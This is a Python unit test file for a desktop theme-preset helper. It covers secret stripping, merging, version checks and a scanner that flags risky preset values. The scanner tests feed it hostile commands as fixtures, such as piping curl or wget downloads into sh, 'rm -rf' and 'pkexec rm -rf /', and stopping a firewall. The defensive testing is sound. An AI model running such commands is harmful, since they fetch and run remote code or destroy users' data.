#!/usr/bin/env python3
"""Tests for preset sanitization and expansion in presets_helper.py."""

import contextlib
import copy
import io
import json
import os
import re
import subprocess
import sys
import tempfile
import unittest

# Add scripts directory to sys.path
SCRIPTS_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
if SCRIPTS_DIR not in sys.path:
    sys.path.insert(0, SCRIPTS_DIR)

import presets_helper


class TestPresetsHelper(unittest.TestCase):
    def setUp(self):
        self.home_dir = "/home/testuser"

    def test_user_data_removal(self):
        """Teste 1: Confirm that googleDrive and search.aliases are removed, while visual search settings remain."""
        input_data = {
            "search": {
                "enableSystemControls": True,
                "enableMathPreview": True,
                "engineBaseUrl": "https://www.google.com/search?q=",
                "aliases": [
                    {"trigger": "g", "command": "google"},
                    {"trigger": "y", "command": "youtube"}
                ]
            },
            "googleDrive": {
                "enabled": True,
                "backupFolders": ["/home/testuser/Documents"],
                "syncInterval": "1d",
                "lastSyncTime": "2026-08-18T00:00:00Z"
            },
            "bar": {
                "height": 48
            }
        }
        sanitized = presets_helper.sanitize_data(copy.deepcopy(input_data), self.home_dir)
        self.assertNotIn("googleDrive", sanitized)
        self.assertIn("search", sanitized)
        self.assertNotIn("aliases", sanitized["search"])
        self.assertTrue(sanitized["search"]["enableSystemControls"])
        self.assertTrue(sanitized["search"]["enableMathPreview"])
        self.assertEqual(sanitized["bar"]["height"], 48)

    def test_secrets_removal(self):
        """Teste 2: Verify recursive removal of secrets with varied casing/naming conventions."""
        input_data = {
            "services": {
                "gmail": {
                    "client_id": "test_client_id",
                    "client_secret": "super_secret_client_secret",
                    "refresh_token": "ya29.secret_refresh_token",
                    "accessToken": "secret_access_token"
                },
                "ticktick": {
                    "ticktick_client_id": "tick_id",
                    "ticktick_client_secret": "tick_secret",
                    "ticktick_access_token": "tick_token"
                },
                "ai": {
                    "geminiApiKey": "AIzaSySecretApiKey",
                    "provider": "google",
                    "model": "gemini-2.5-flash"
                }
            },
            "auth": {
                "password": "mypassword123",
                "passwd": "otherpasswd",
                "cookie": "session=abc123xyz"
            },
            "appearance": {
                "palette": "vynx"
            }
        }
        sanitized = presets_helper.sanitize_data(copy.deepcopy(input_data), self.home_dir)
        # Check that secret keys are removed
        services = sanitized.get("services", {})
        gmail = services.get("gmail", {})
        self.assertNotIn("client_secret", gmail)
        self.assertNotIn("refresh_token", gmail)
        self.assertNotIn("accessToken", gmail)

        ticktick = services.get("ticktick", {})
        self.assertNotIn("ticktick_client_secret", ticktick)
        self.assertNotIn("ticktick_access_token", ticktick)

        ai = services.get("ai", {})
        self.assertNotIn("geminiApiKey", ai)
        self.assertEqual(ai.get("provider"), "google")
        self.assertEqual(ai.get("model"), "gemini-2.5-flash")

        auth = sanitized.get("auth", {})
        self.assertNotIn("password", auth)
        self.assertNotIn("passwd", auth)
        self.assertNotIn("cookie", auth)

        self.assertEqual(sanitized["appearance"]["palette"], "vynx")

    def test_foreign_home_sanitization(self):
        """Teste 3: Confirm foreign /home/otheruser and /var/home/otheruser are transformed to $HOME."""
        input_data = {
            "background": {
                "wallpaperPath": "/home/otheruser/Pictures/wall.jpg"
            },
            "profile": {
                "avatar": "/var/home/silverblueuser/avatar.png"
            },
            "local": {
                "customPath": "/home/testuser/MyFiles/doc.pdf"
            }
        }
        sanitized = presets_helper.sanitize_data(copy.deepcopy(input_data), self.home_dir)
        self.assertEqual(sanitized["background"]["wallpaperPath"], "$HOME/Pictures/wall.jpg")
        self.assertEqual(sanitized["profile"]["avatar"], "$HOME/avatar.png")
        self.assertEqual(sanitized["local"]["customPath"], "$HOME/MyFiles/doc.pdf")

    def test_known_paths_normalization(self):
        """Teste 4: Normalize Screen Record, Screen Snip, and LocalSend paths."""
        input_data = {
            "screenRecord": {
                "savePath": "/home/otheruser/Videos/CustomRecordings"
            },
            "screenSnip": {
                "savePath": "/home/otheruser/Pictures/Screenshots"
            },
            "localsend": {
                "downloadPath": "/opt/custom/localsend"
            }
        }
        sanitized = presets_helper.sanitize_data(copy.deepcopy(input_data), self.home_dir)
        self.assertEqual(sanitized["screenRecord"]["savePath"], "$HOME/Videos/CustomRecordings")
        self.assertEqual(sanitized["screenSnip"]["savePath"], "$HOME/Pictures/Screenshots")
        # /opt/custom/localsend is absolute outside /home, so fallback $HOME/Downloads is used
        self.assertEqual(sanitized["localsend"]["downloadPath"], "$HOME/Downloads")

    def test_monitors_reset(self):
        """Teste 5: Ensure machine-specific monitor connector names are reset."""
        input_data = {
            "background": {
                "widgets": {
                    "showOnlyOnSingleMonitor": True,
                    "targetMonitor": "DP-2"
                }
            },
            "bar": {
                "onlyShowOnSingleMonitor": True,
                "singleMonitorName": "HDMI-A-1",
                "screenList": ["DP-1", "DP-2"],
                "floatingNotch": {
                    "onlyShowOnSingleMonitor": True,
                    "singleMonitorName": "eDP-1"
                }
            },
            "interactions": {
                "touchGestures": {
                    "targetMonitor": "DP-3"
                }
            },
            "notifications": {
                "monitor": {
                    "enable": True,
                    "name": "HDMI-A-2"
                }
            }
        }
        sanitized = presets_helper.sanitize_data(copy.deepcopy(input_data), self.home_dir)
        self.assertFalse(sanitized["background"]["widgets"]["showOnlyOnSingleMonitor"])
        self.assertEqual(sanitized["background"]["widgets"]["targetMonitor"], "")
        self.assertFalse(sanitized["bar"]["onlyShowOnSingleMonitor"])
        self.assertEqual(sanitized["bar"]["singleMonitorName"], "")
        self.assertEqual(sanitized["bar"]["screenList"], [])
        self.assertFalse(sanitized["bar"]["floatingNotch"]["onlyShowOnSingleMonitor"])
        self.assertEqual(sanitized["bar"]["floatingNotch"]["singleMonitorName"], "")
        self.assertEqual(sanitized["interactions"]["touchGestures"]["targetMonitor"], "auto")
        self.assertFalse(sanitized["notifications"]["monitor"]["enable"])
        self.assertEqual(sanitized["notifications"]["monitor"]["name"], "")

    def test_visual_values_preserved(self):
        """Teste 6: Verify legitimate visual styling options are preserved intact."""
        input_data = {
            "appearance": {
                "rounding": {
                    "normal": 17,
                    "large": 23,
                    "windowRounding": 16
                },
                "transparency": {
                    "enable": True,
                    "opacity": 0.85
                },
                "animations": {
                    "enable": True,
                    "speed": 1.0
                }
            },
            "bar": {
                "height": 42,
                "position": "top"
            }
        }
        sanitized = presets_helper.sanitize_data(copy.deepcopy(input_data), self.home_dir)
        self.assertEqual(sanitized["appearance"]["rounding"]["normal"], 17)
        self.assertEqual(sanitized["appearance"]["rounding"]["windowRounding"], 16)
        self.assertTrue(sanitized["appearance"]["transparency"]["enable"])
        self.assertEqual(sanitized["appearance"]["transparency"]["opacity"], 0.85)
        self.assertEqual(sanitized["bar"]["height"], 42)
        self.assertEqual(sanitized["bar"]["position"], "top")

    def test_dock_blacklist_and_sanitization(self):
        """Teste 7: Verify dock apps and dock widgets are sanitized/blacklisted while visual styles remain."""
        input_data = {
            "dock": {
                "enable": True,
                "dockStyle": "floating",
                "height": 64,
                "dockRadius": 20,
                "enableShapeMask": True,
                "shapeMask": "Circle",
                "enableMagnification": True,
                "magnificationScale": 1.7,
                # Blacklisted dock apps and user items:
                "pinnedApps": ["kitty", "discord", "obsidian"],
                "pinnedFiles": ["/home/testuser/notes.txt"],
                "appGroups": [{"id": "work", "apps": ["slack", "zoom"]}],
                "order": ["pin", "app:kitty", "app:discord", "runningApps", "media", "trash"],
                "ignoredAppRegexes": ["^steam_app_.*"],
                "livePreviewAppId": "org.mozilla.firefox",
                # Blacklisted dock widgets:
                "enableMediaWidget": True,
                "enableWeatherWidget": True,
                "enableSportsWidget": True,
                "enableLivePreviewWidget": True,
                "livePreviewSlots": 3,
                "livePreviewPaintCursor": True,
                "livePreviewCaptureMode": "visible",
                "livePreviewFollowActiveWindow": True,
                "showPhoneButton": True,
                "showTrashButton": True,
                "showOverviewButton": True,
                "showPinButton": True
            }
        }
        sanitized = presets_helper.sanitize_data(copy.deepcopy(input_data), self.home_dir)
        dock = sanitized.get("dock", {})
        # Visual styling preserved
        self.assertTrue(dock.get("enable"))
        self.assertEqual(dock.get("dockStyle"), "floating")
        self.assertEqual(dock.get("height"), 64)
        self.assertEqual(dock.get("dockRadius"), 20)
        self.assertTrue(dock.get("enableShapeMask"))
        self.assertEqual(dock.get("shapeMask"), "Circle")
        self.assertTrue(dock.get("enableMagnification"))
        self.assertEqual(dock.get("magnificationScale"), 1.7)

        # Blacklisted dock items and widgets stripped
        for key in presets_helper.DOCK_BLACKLIST_KEYS:
            self.assertNotIn(key, dock, f"Key {key} should have been blacklisted and stripped from dock preset")

    def test_dock_preserved_on_expand(self):
        """Teste 8: Verify that expanding a preset preserves the importing user's existing dock configuration."""
        import tempfile
        import json

        with tempfile.TemporaryDirectory() as tmpdir:
            preset_file = os.path.join(tmpdir, "MyPreset.json")
            target_config = os.path.join(tmpdir, "config.json")

            # Preset with theme styling but sanitized dock (no pinnedApps or dock widgets)
            preset_data = {
                "appearance": {"palette": "catppuccin"},
                "dock": {
                    "enable": True,
                    "dockStyle": "islands",
                    "height": 50
                }
            }
            with open(preset_file, 'w', encoding='utf-8') as f:
                json.dump(preset_data, f)

            # User B's existing config with their own dock apps and widgets
            user_b_config = {
                "appearance": {"palette": "nord"},
                "dock": {
                    "pinnedApps": ["firefox", "alacritty"],
                    "pinnedFiles": [f"{self.home_dir}/Documents"],
                    "appGroups": [{"id": "dev", "apps": ["code", "nvim"]}],
                    "order": ["pin", "app:firefox", "app:alacritty", "runningApps"],
                    "enableMediaWidget": True,
                    "enableWeatherWidget": False,
                    "showTrashButton": True
                }
            }
            with open(target_config, 'w', encoding='utf-8') as f:
                json.dump(user_b_config, f)

            # Expand preset into target config
            presets_helper.expand(preset_file, target_config, tmpdir, "MyPreset")

            with open(target_config, 'r', encoding='utf-8') as f:
                expanded = json.load(f)

            # Preset visual properties applied
            self.assertEqual(expanded["appearance"]["palette"], "catppuccin")
            self.assertEqual(expanded["dock"]["dockStyle"], "islands")
            self.assertEqual(expanded["dock"]["height"], 50)

            # User B's dock items and widgets preserved
            self.assertEqual(expanded["dock"]["pinnedApps"], ["firefox", "alacritty"])
            self.assertEqual(expanded["dock"]["pinnedFiles"], [f"{self.home_dir}/Documents"])
            self.assertEqual(len(expanded["dock"]["appGroups"]), 1)
            self.assertEqual(expanded["dock"]["order"], ["pin", "app:firefox", "app:alacritty", "runningApps"])
            self.assertTrue(expanded["dock"]["enableMediaWidget"])
            self.assertFalse(expanded["dock"]["enableWeatherWidget"])
            self.assertTrue(expanded["dock"]["showTrashButton"])

    def test_user_profile_and_banner_path_normalization(self):
        """Teste 9: Banner path is normalized to $HOME; profile picture paths are dropped."""
        input_data = {
            "userProfile": {
                "imageStyle": "custom",
                "imagePath": "/home/testuser/Pictures/avatars/user.gif"
            },
            "sidebar": {
                "enableBanner": True,
                "bannerImage": "/var/home/otheruser/Pictures/banner.png",
                "dashboardHeader": {
                    "profileImagePath": "/home/testuser/Pictures/avatars/user.gif"
                }
            }
        }
        sanitized = presets_helper.sanitize_data(copy.deepcopy(input_data), self.home_dir)
        # The banner ships with the preset, so its path stays portable.
        self.assertEqual(sanitized["sidebar"]["bannerImage"], "$HOME/Pictures/banner.png")
        # The profile picture never does: it is the author's own avatar.
        self.assertNotIn("imagePath", sanitized["userProfile"])
        self.assertNotIn("profileImagePath", sanitized["sidebar"]["dashboardHeader"])
        self.assertEqual(sanitized["userProfile"]["imageStyle"], "custom")

    def test_user_profile_and_banner_fallback_on_expand(self):
        """Teste 10: Verify expand falls back to {name}_profile and {name}_banner when original paths do not exist."""
        import tempfile
        import json

        with tempfile.TemporaryDirectory() as tmpdir:
            preset_file = os.path.join(tmpdir, "NeonTheme.json")
            target_config = os.path.join(tmpdir, "config.json")
            
            # Create companion asset files in preset directory
            profile_asset = os.path.join(tmpdir, "NeonTheme_profile.gif")
            banner_asset = os.path.join(tmpdir, "NeonTheme_banner.jpg")
            wall_asset = os.path.join(tmpdir, "NeonTheme.png")
            open(profile_asset, 'w').close()
            open(banner_asset, 'w').close()
            open(wall_asset, 'w').close()

            # Preset with non-existent foreign paths
            preset_data = {
                "background": {
                    "wallpaperPath": "/home/foreignuser/wallpaper.png"
                },
                "userProfile": {
                    "imageStyle": "custom",
                    "imagePath": "/home/foreignuser/avatar.gif"
                },
                "sidebar": {
                    "enableBanner": True,
                    "bannerImage": "/home/foreignuser/banner.jpg",
                    "dashboardHeader": {
                        "profileImagePath": "/home/foreignuser/avatar.gif"
                    }
                }
            }
            with open(preset_file, 'w', encoding='utf-8') as f:
                json.dump(preset_data, f)

            presets_helper.expand(preset_file, target_config, tmpdir, "NeonTheme")

            with open(target_config, 'r', encoding='utf-8') as f:
                expanded = json.load(f)

            self.assertEqual(expanded["background"]["wallpaperPath"], wall_asset)
            self.assertEqual(expanded["userProfile"]["imagePath"], profile_asset)
            self.assertEqual(expanded["sidebar"]["dashboardHeader"]["profileImagePath"], profile_asset)
            self.assertEqual(expanded["sidebar"]["bannerImage"], banner_asset)


def populate(patterns, value):
    """Build a config with every dotted pattern present, '*' as a literal key."""
    data = {}
    for pattern in patterns:
        concrete = ["w1" if part == "*" else part for part in pattern.split(".")]
        presets_helper.set_path(data, concrete, value)
    return data


class TestPersonalDataStripping(unittest.TestCase):
    """Nothing in PERSONAL_PATHS may survive into a saved preset."""

    def setUp(self):
        self.home_dir = "/home/testuser"

    def test_every_personal_path_is_stripped(self):
        data = populate(presets_helper.PERSONAL_PATHS, "LEAK")
        sanitized = presets_helper.sanitize_data(data, self.home_dir)
        for pattern in presets_helper.PERSONAL_PATHS:
            self.assertEqual(
                presets_helper.find_paths(sanitized, pattern), [],
                f"{pattern} survived sanitization")

    def test_personal_paths_are_all_restored_on_apply(self):
        """Drift guard: anything stripped on save must be handed back on load."""
        for pattern in presets_helper.PERSONAL_PATHS:
            self.assertIn(pattern, presets_helper.LOCAL_ONLY_PATHS)

    def test_bluetooth_macs_and_contacts_do_not_travel(self):
        data = {
            "bluetoothDeviceImages": [{"mac": "34:E3:FB:8D:1C:AC", "image": "device.png"}],
            "soundcore": {"macAddress": "E8:EE:CC:96:31:3A", "enableEqualizer": True},
            "phone": {"contacts": {"favoriteIds": ["86r812-4D472D3B45"], "showAvatars": True}},
        }
        sanitized = presets_helper.sanitize_data(copy.deepcopy(data), self.home_dir)
        self.assertNotIn("bluetoothDeviceImages", sanitized)
        self.assertNotIn("macAddress", sanitized["soundcore"])
        self.assertNotIn("favoriteIds", sanitized["phone"]["contacts"])
        # Styling next to the stripped keys is untouched.
        self.assertTrue(sanitized["soundcore"]["enableEqualizer"])
        self.assertTrue(sanitized["phone"]["contacts"]["showAvatars"])

    def test_desktop_widget_photos_do_not_travel(self):
        data = {"background": {"widgets": {
            "photo_pill_2x1": {"imagePath": "/home/testuser/Downloads/me.png", "radius": 12},
            "showOnlyOnSingleMonitor": True,
        }}}
        sanitized = presets_helper.sanitize_data(copy.deepcopy(data), self.home_dir)
        widget = sanitized["background"]["widgets"]["photo_pill_2x1"]
        self.assertNotIn("imagePath", widget)
        self.assertEqual(widget["radius"], 12)

    def test_weather_location_does_not_travel(self):
        """A preset would otherwise say where its author lives. The city and
        the GPS switch are dropped as a pair: dropping only the city would
        leave the importer pinned to nowhere."""
        data = {"weather": {"enable": True, "enableGPS": False, "city": "Grenoble",
                            "fetchInterval": 10}}
        sanitized = presets_helper.sanitize_data(copy.deepcopy(data), self.home_dir)
        self.assertNotIn("city", sanitized["weather"])
        self.assertNotIn("enableGPS", sanitized["weather"])
        # Whether the widget is shown at all is a look, and it stays.
        self.assertTrue(sanitized["weather"]["enable"])
        self.assertEqual(sanitized["weather"]["fetchInterval"], 10)

    def test_weather_units_are_never_applied(self):
        """Like the interface language, units are the reader's choice: a
        preset from a US author must not flip anyone to Fahrenheit."""
        self.assertIn("weather.useUSCS", presets_helper.LOCAL_ONLY_PATHS)


class TestPresetMerge(unittest.TestCase):
    """merge() layers a preset over a config instead of replacing it."""

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.preset_path = os.path.join(self.tmp.name, "Theme.json")
        self.config_path = os.path.join(self.tmp.name, "config.json")

    def write(self, path, data):
        with open(path, "w", encoding="utf-8") as f:
            json.dump(data, f)

    def merge(self, preset, config, preset_name="Theme"):
        self.write(self.preset_path, preset)
        self.write(self.config_path, config)
        presets_helper.merge(self.preset_path, self.config_path, self.config_path,
                             self.tmp.name, preset_name)
        with open(self.config_path, encoding="utf-8") as f:
            return json.load(f)

    def test_secrets_and_user_data_survive(self):
        """The bug this replaces: applying a shared preset wiped these."""
        merged = self.merge(
            preset={"appearance": {"palette": "catppuccin"}},
            config={
                "ai": {"apiKey": "sk-live-secret"},
                "googleDrive": {"enabled": True, "refreshToken": "ya29.token"},
                "search": {"aliases": [{"trigger": "g", "command": "google"}]},
                "dock": {"pinnedApps": ["firefox"]},
                "appearance": {"palette": "nord"},
            })
        self.assertEqual(merged["ai"]["apiKey"], "sk-live-secret")
        self.assertEqual(merged["googleDrive"]["refreshToken"], "ya29.token")
        self.assertEqual(merged["search"]["aliases"][0]["trigger"], "g")
        self.assertEqual(merged["dock"]["pinnedApps"], ["firefox"])
        self.assertEqual(merged["appearance"]["palette"], "catppuccin")

    def test_preset_values_actually_apply(self):
        """Guard against protecting so much that nothing lands."""
        merged = self.merge(
            preset={"bar": {"height": 48, "cornerStyle": 1}, "dock": {"dockStyle": "islands"}},
            config={"bar": {"height": 32, "cornerStyle": 0, "screenList": ["DP-1"]},
                    "dock": {"dockStyle": "floating", "pinnedApps": ["kitty"]}})
        self.assertEqual(merged["bar"]["height"], 48)
        self.assertEqual(merged["bar"]["cornerStyle"], 1)
        self.assertEqual(merged["dock"]["dockStyle"], "islands")
        self.assertEqual(merged["dock"]["pinnedApps"], ["kitty"])

    def test_every_local_only_path_comes_from_the_importer(self):
        merged = self.merge(
            preset=populate(presets_helper.LOCAL_ONLY_PATHS, "THEIRS"),
            config=populate(presets_helper.LOCAL_ONLY_PATHS, "MINE"))
        for pattern in presets_helper.LOCAL_ONLY_PATHS:
            for path in presets_helper.find_paths(merged, pattern):
                self.assertEqual(presets_helper.get_path(merged, path), "MINE",
                                 f"{pattern} came from the preset")

    def test_local_only_path_absent_locally_is_not_inherited(self):
        """A legacy preset carrying a monitor name must not impose it."""
        merged = self.merge(
            preset={"bar": {"singleMonitorName": "DP-3", "height": 40}},
            config={"bar": {"height": 32}})
        self.assertNotIn("singleMonitorName", merged["bar"])
        self.assertEqual(merged["bar"]["height"], 40)

    def test_preset_config_version_survives(self):
        """migrateRaw() only runs if the file still says which version it is."""
        merged = self.merge(preset={"configVersion": 9, "bar": {"height": 40}},
                            config={"configVersion": 16, "bar": {"height": 32}})
        self.assertEqual(merged["configVersion"], 9)

    def test_wallpaper_falls_back_to_bundled_asset(self):
        bundled = os.path.join(self.tmp.name, "Theme.png")
        open(bundled, "w").close()
        merged = self.merge(
            preset={"background": {"wallpaperPath": "/home/author/gone.png"}},
            config={"background": {"wallpaperPath": "/home/testuser/mine.png"}})
        self.assertEqual(merged["background"]["wallpaperPath"], bundled)

    def test_dead_asset_path_falls_back_to_the_local_one(self):
        """No bundled light-mode wallpaper ships, so the importer keeps theirs."""
        existing = os.path.join(self.tmp.name, "local-light.png")
        open(existing, "w").close()
        merged = self.merge(
            preset={"background": {"lightModeWallpaperPath": "/home/author/gone.png"}},
            config={"background": {"lightModeWallpaperPath": existing}})
        self.assertEqual(merged["background"]["lightModeWallpaperPath"], existing)

    def test_home_placeholder_is_expanded(self):
        merged = self.merge(preset={"apps": {"note": "$HOME/notes"}}, config={})
        self.assertEqual(merged["apps"]["note"], presets_helper.user_home() + "/notes")

    def test_malformed_config_is_refused(self):
        """Never merge onto an empty dict: the broken file is the only truth."""
        self.write(self.preset_path, {"bar": {"height": 40}})
        with open(self.config_path, "w", encoding="utf-8") as f:
            f.write("{ not json")
        with self.assertRaises(ValueError):
            presets_helper.merge(self.preset_path, self.config_path, self.config_path)

    def test_missing_config_is_treated_as_empty(self):
        self.write(self.preset_path, {"bar": {"height": 40}})
        presets_helper.merge(self.preset_path, os.path.join(self.tmp.name, "none.json"),
                             self.config_path)
        with open(self.config_path, encoding="utf-8") as f:
            self.assertEqual(json.load(f)["bar"]["height"], 40)


class TestPresetScan(unittest.TestCase):
    """scan() reports what applying a preset would let run, reach or unlock."""

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.preset_path = os.path.join(self.tmp.name, "Theme.json")
        self.config_path = os.path.join(self.tmp.name, "config.json")

    def write(self, path, data):
        with open(path, "w", encoding="utf-8") as f:
            json.dump(data, f)

    def scan(self, preset, config=None):
        self.write(self.preset_path, preset)
        if config is None:
            return presets_helper.scan(self.preset_path)
        self.write(self.config_path, config)
        return presets_helper.scan(self.preset_path, self.config_path)

    def paths(self, result, category=None):
        return [item["path"] for group in result["groups"]
                for item in group["items"]
                if category is None or group["id"] == category]

    def group(self, result, category):
        for group in result["groups"]:
            if group["id"] == category:
                return group
        return None

    def test_identical_preset_reports_nothing(self):
        """The common case: a preset saved from this very config is silent."""
        config = {"apps": {"terminal": "kitty -1"}, "appearance": {"transparency": True}}
        result = self.scan(dict(config), config)
        self.assertTrue(result["ok"])
        self.assertEqual(result["total"], 0)
        self.assertEqual(result["groups"], [])

    def test_changed_app_command_is_reported(self):
        result = self.scan({"apps": {"terminal": "curl http://x | sh"}},
                           {"apps": {"terminal": "kitty -1"}})
        self.assertEqual(self.paths(result, "shell"), ["apps.terminal"])
        self.assertEqual(self.group(result, "shell")["severity"], "high")

    def test_mode_shell_action_is_reported_with_its_mode_name(self):
        preset = {"modes": {"modes": [{"id": "focus", "name": "Focus", "actions": [
            {"type": "dnd", "value": True},
            {"type": "shell", "value": {"start": "rm -rf ~/Documents", "end": "echo bye"}},
        ]}]}}
        result = self.scan(preset, {})
        self.assertEqual(self.paths(result, "shell"),
                         ["modes.modes.0.actions.1.value.start",
                          "modes.modes.0.actions.1.value.end"])
        labels = [i["label"] for i in self.group(result, "shell")["items"]]
        self.assertEqual(labels, ["Focus (on start)", "Focus (on end)"])

    def test_routine_shell_action_with_a_bare_string_value(self):
        preset = {"modes": {"routines": [
            {"id": "r1", "name": "Morning", "actions": [
                {"type": "shell", "value": "systemctl --user stop firewall"}]}]}}
        result = self.scan(preset, {})
        # Once, as a shell command -- not a second time as an unclassified one.
        self.assertEqual(self.paths(result),
                         ["modes.routines.0.actions.0.value.start"])

    def test_shell_command_already_in_the_config_is_not_reported(self):
        """Matched on the command, so reordering modes is not a page of warnings."""
        action = {"type": "shell", "value": {"start": "hyprctl reload"}}
        current = {"modes": {"modes": [
            {"id": "a", "name": "A", "actions": []},
            {"id": "b", "name": "B", "actions": [action]},
        ]}}
        preset = {"modes": {"modes": [
            {"id": "b", "name": "B", "actions": [action]},
            {"id": "a", "name": "A", "actions": []},
        ]}}
        self.assertEqual(self.scan(preset, current)["total"], 0)

    def test_non_shell_mode_actions_are_left_alone(self):
        preset = {"modes": {"modes": [{"id": "q", "name": "Quiet", "actions": [
            {"type": "dnd", "value": True}, {"type": "media", "value": "pause"}]}]}}
        self.assertEqual(self.scan(preset, {})["total"], 0)

    def test_assistant_permissions_are_reported(self):
        result = self.scan({"ai": {"tools": {"allowShellInLocalPolicy": True,
                                             "alwaysAllow": ["shell"]}}}, {})
        self.assertEqual(sorted(self.paths(result, "ai")),
                         ["ai.tools.allowShellInLocalPolicy", "ai.tools.alwaysAllow"])

    def test_assistant_permission_left_off_is_not_reported(self):
        """False is the safe value; warning about it would be noise."""
        result = self.scan({"ai": {"tools": {"allowShellInLocalPolicy": False}}},
                           {"ai": {"tools": {"allowShellInLocalPolicy": True}}})
        self.assertEqual(result["total"], 0)

    def test_redirected_resolver_and_search_engine_are_reported(self):
        preset = {"dnsOverTls": {"serverAddress": "6.6.6.6"},
                  "search": {"engineBaseUrl": "https://elsewhere.example/?q="}}
        result = self.scan(preset, {"dnsOverTls": {"serverAddress": "94.140.14.14"},
                                    "search": {"engineBaseUrl": "https://google.com/?q="}})
        self.assertEqual(sorted(self.paths(result, "network")),
                         ["dnsOverTls.serverAddress", "search.engineBaseUrl"])
        self.assertEqual(self.group(result, "network")["severity"], "medium")

    def test_unclassified_key_that_reads_like_a_command(self):
        """A preset from a newer build can hide a command in a key nobody listed."""
        result = self.scan({"somethingNew": {"hook": "bash -c 'wget http://x -O- | sh'"}}, {})
        self.assertEqual(self.paths(result, "unknown"), ["somethingNew.hook"])

    def test_ordinary_strings_are_not_mistaken_for_commands(self):
        preset = {"appearance": {"iconTheme": "Papirus", "fonts": {"main": "Rubik"}},
                  "bar": {"topLeftIcon": "spark"}}
        self.assertEqual(self.scan(preset, {})["total"], 0)

    def test_machine_local_values_are_never_reported(self):
        """merge() hands these back, so a preset cannot deliver them."""
        preset = {"update": {"scriptPath": "/tmp/evil.sh"},
                  "screenRecord": {"savePath": "/home/attacker/vids"}}
        current = {"update": {"scriptPath": "/home/me/update.sh"},
                   "screenRecord": {"savePath": "/home/me/Videos"}}
        self.assertEqual(self.scan(preset, current)["total"], 0)

    def test_groups_come_back_worst_first(self):
        preset = {"apps": {"terminal": "curl http://x | sh"},
                  "ai": {"tools": {"allowShellInLocalPolicy": True}},
                  "dnsOverTls": {"serverAddress": "6.6.6.6"},
                  "somethingNew": {"hook": "pkexec rm -rf /"}}
        result = self.scan(preset, {})
        self.assertEqual([g["id"] for g in result["groups"]],
                         ["shell", "ai", "network", "unknown"])
        self.assertEqual(result["total"], 4)

    def test_long_values_are_capped(self):
        command = "curl " + "a" * 1000
        result = self.scan({"apps": {"terminal": command}}, {})
        value = result["groups"][0]["items"][0]["value"]
        self.assertLessEqual(len(value), presets_helper.VALUE_PREVIEW_LIMIT)
        self.assertTrue(value.endswith("\u2026"))

    def test_malformed_preset_is_refused(self):
        with open(self.preset_path, "w", encoding="utf-8") as f:
            f.write("{ not json")
        with self.assertRaises(ValueError):
            presets_helper.scan(self.preset_path, self.config_path)

    def test_malformed_config_does_not_hide_findings(self):
        """A config that cannot be read is no reason to vouch for a preset."""
        with open(self.config_path, "w", encoding="utf-8") as f:
            f.write("[]")
        self.write(self.preset_path, {"apps": {"terminal": "curl http://x | sh"}})
        result = presets_helper.scan(self.preset_path, self.config_path)
        self.assertEqual(self.paths(result, "shell"), ["apps.terminal"])


class TestSchemaCompatibility(unittest.TestCase):
    """Migrate up, block newer -- the rule the apply path is built on."""

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.ours = presets_helper.current_config_version()

    def write(self, name, data):
        path = os.path.join(self.tmp.name, name)
        with open(path, "w", encoding="utf-8") as f:
            json.dump(data, f)
        return path

    def test_version_is_read_from_the_shell_itself(self):
        """Not a constant kept in step by hand: Config.qml is the source."""
        qml = os.path.join(os.path.dirname(SCRIPTS_DIR), "modules", "common", "Config.qml")
        with open(qml, "r", encoding="utf-8") as f:
            declared = int(re.search(r"currentConfigVersion\s*:\s*(\d+)", f.read()).group(1))
        self.assertEqual(self.ours, declared)

    def test_newer_preset_is_refused_with_a_reason(self):
        verdict = presets_helper.compatibility(self.ours + 1)
        self.assertFalse(verdict["ok"])
        self.assertEqual(verdict["status"], "too-new")
        self.assertEqual(verdict["ours"], self.ours)
        self.assertEqual(verdict["theirs"], self.ours + 1)
        self.assertTrue(verdict["reason"])

    def test_older_preset_is_allowed_and_marked_for_migration(self):
        verdict = presets_helper.compatibility(self.ours - 1)
        self.assertTrue(verdict["ok"])
        self.assertEqual(verdict["status"], "migrate")

    def test_matching_version_is_current(self):
        self.assertEqual(presets_helper.compatibility(self.ours)["status"], "current")

    def test_a_preset_that_does_not_say_is_undecided_rather_than_refused(self):
        """Every preset exported before versioning existed lands here."""
        for value in (None, "16", 16.0, True):
            verdict = presets_helper.compatibility(value)
            self.assertTrue(verdict["ok"], value)
            self.assertEqual(verdict["status"], "unknown", value)

    def test_preset_version_is_read_off_the_file(self):
        path = self.write("Theme.json", {"configVersion": 9, "bar": {}})
        self.assertEqual(presets_helper.preset_config_version(path), 9)

    def test_preset_version_is_none_when_missing_or_not_a_number(self):
        self.assertIsNone(presets_helper.preset_config_version(
            self.write("A.json", {"bar": {}})))
        self.assertIsNone(presets_helper.preset_config_version(
            self.write("B.json", {"configVersion": "9"})))
        self.assertIsNone(presets_helper.preset_config_version(
            self.write("C.json", {"configVersion": True})))
        self.assertIsNone(presets_helper.preset_config_version(
            os.path.join(self.tmp.name, "nothing.json")))

    def test_scan_carries_the_verdict(self):
        """The apply dialog reads one scan line; the block has to be in it."""
        path = self.write("Future.json", {"configVersion": self.ours + 5})
        result = presets_helper.scan(path)
        self.assertFalse(result["compatibility"]["ok"])
        self.assertEqual(result["compatibility"]["status"], "too-new")

        path = self.write("Past.json", {"configVersion": self.ours - 1})
        self.assertEqual(presets_helper.scan(path)["compatibility"]["status"], "migrate")

    def test_list_reports_the_version_of_every_preset(self):
        self.write("Old.json", {"configVersion": 3})
        self.write("Nameless.json", {"bar": {}})
        buffer = io.StringIO()
        with contextlib.redirect_stdout(buffer):
            presets_helper.list_presets(self.tmp.name)
        rows = {json.loads(line)["name"]: json.loads(line)
                for line in buffer.getvalue().splitlines() if line.strip()}
        self.assertEqual(rows["Old"]["configVersion"], 3)
        # 0, not null: the QML list model types its roles off the first row.
        self.assertEqual(rows["Nameless"]["configVersion"], 0)

    def test_the_cli_prints_one_json_line(self):
        """presets.sh reads this to refuse an apply before anything is written."""
        path = self.write("Future.json", {"configVersion": self.ours + 1})
        proc = subprocess.run(
            [sys.executable, os.path.join(SCRIPTS_DIR, "presets_helper.py"), "compat", path],
            capture_output=True, text=True)
        self.assertEqual(proc.returncode, 0)
        verdict = json.loads(proc.stdout.strip())
